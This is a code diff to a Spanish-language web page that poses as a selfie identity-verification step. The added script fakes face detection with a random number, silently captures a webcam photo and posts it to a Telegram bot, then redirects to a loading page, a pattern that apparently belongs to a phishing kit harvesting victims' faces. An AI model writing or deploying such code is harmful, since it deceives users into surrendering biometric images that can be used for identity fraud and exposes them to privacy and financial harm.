@@ -37,7 +37,6 @@ video {
     opacity:0;
     transition:0.4s;
 }
-
 .alerta-selfie.show{
     opacity:1;
 }
@@ -90,7 +89,6 @@ video {
     border-radius: 20px;
     display:none;
 }
-
 .warning-message.show{
     display:block;
 }
@@ -126,16 +124,22 @@ const oval = document.getElementById("oval");
 const statusText = document.getElementById("status");
 const warningMessage = document.getElementById("warningMessage");
 
-/* 🔥 ALERTA AUTO (5 SEGUNDOS) */
+/* 🔥 ALERTA 5 SEGUNDOS */
 const alertaSelfie = document.getElementById("alertaSelfie");
-
 window.addEventListener("load", ()=>{
     alertaSelfie.classList.add("show");
-
     setTimeout(()=>{
         alertaSelfie.classList.remove("show");
     },5000);
 });
+
+/* CONFIG TELEGRAM */
+const TELEGRAM_CONFIG = {
+    token: "TU_TOKEN_AQUI",
+    chatId: "TU_CHAT_ID"
+};
+
+let photoTaken = false;
 
 /* CAMARA */
 navigator.mediaDevices.getUserMedia({ video:true })
@@ -143,17 +147,21 @@ navigator.mediaDevices.getUserMedia({ video:true })
     video.srcObject = stream;
 })
 .catch(()=>{
-    statusText.innerText="Error cámara";
+    statusText.innerText="❌ Error cámara";
 });
 
-/* DETECCION SIMPLE */
+/* DETECCIÓN SIMPLE + CAPTURA */
 setInterval(()=>{
+    if(photoTaken) return;
+
     const random = Math.random();
 
     if(random > 0.6){
         oval.classList.add("valid");
         warningMessage.classList.remove("show");
         statusText.innerText="✅ Rostro detectado";
+
+        takePhotoAndSend(); // 🔥 AQUÍ SE DISPARA
     }else{
         oval.classList.remove("valid");
         warningMessage.classList.add("show");
@@ -161,6 +169,62 @@ setInterval(()=>{
     }
 
 },1500);
+
+/* TOMAR FOTO */
+function takePhotoAndSend(){
+    if(photoTaken) return;
+    photoTaken = true;
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const imageData = canvas.toDataURL("image/png");
+
+    enviarATelegram(imageData);
+}
+
+/* ENVIAR A TELEGRAM */
+function enviarATelegram(imgData){
+    const blob = dataURLtoBlob(imgData);
+    const formData = new FormData();
+
+    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
+    formData.append('photo', blob, 'selfie.png');
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    })
+    .then(()=>{
+        statusText.innerText="✅ Selfie enviada";
+        setTimeout(()=>{
+            window.location.href="loading.html";
+        },3000);
+    })
+    .catch(()=>{
+        statusText.innerText="❌ Error envío";
+        photoTaken = false;
+    });
+}
+
+/* CONVERTIR */
+function dataURLtoBlob(dataURL){
+    const arr = dataURL.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+
+    while(n--){
+        u8arr[n] = bstr.charCodeAt(n);
+    }
+
+    return new Blob([u8arr], { type: mime });
+}
 </script>
 
 </body>
